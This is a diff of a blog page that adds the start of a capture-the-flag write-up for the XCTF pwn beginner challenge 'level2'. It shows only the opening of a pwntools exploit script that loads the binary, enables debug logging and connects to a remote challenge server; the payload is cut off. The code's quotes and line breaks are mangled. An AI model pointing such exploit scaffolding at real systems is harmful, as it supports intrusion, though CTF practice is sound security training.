@@ -349,7 +349,16 @@
 
 签到题你的答案是：
 
+#攻防世界pwn新手区
 
+
+level2题目开启了保护，exp如下：code：‘#!/usr/bin/python
+
+-- coding: UTF-8 --from pwn import*
+#p = process(‘./level2’)elf =ELF(‘./level2’)context.log_level = ‘debug’p = remote(‘111.198.29.45’,48044)
+#libc = ELF(‘./libc_32.so.6’)
+def debug():    gdb.attach(p)    pause()
+...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
